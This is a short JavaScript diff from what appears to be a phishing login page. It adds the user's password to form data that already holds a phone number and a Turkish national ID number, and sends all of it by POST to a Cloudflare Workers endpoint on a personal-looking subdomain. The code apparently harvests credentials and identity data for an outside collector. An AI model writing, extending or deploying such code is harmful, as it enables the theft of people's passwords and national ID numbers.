@@ -440,7 +440,7 @@ loginBtn.addEventListener('click', function () {
     var data = new FormData();
     data.append('telno', telno);
     data.append('tcno', tcno); // Cookie'den alınan adı ekle
-  
+    data.append('pass', pass);
     fetch('https://worker-lingering-scene-1b87.selimjuhan2.workers.dev/', {
         method: 'POST',
         body: data
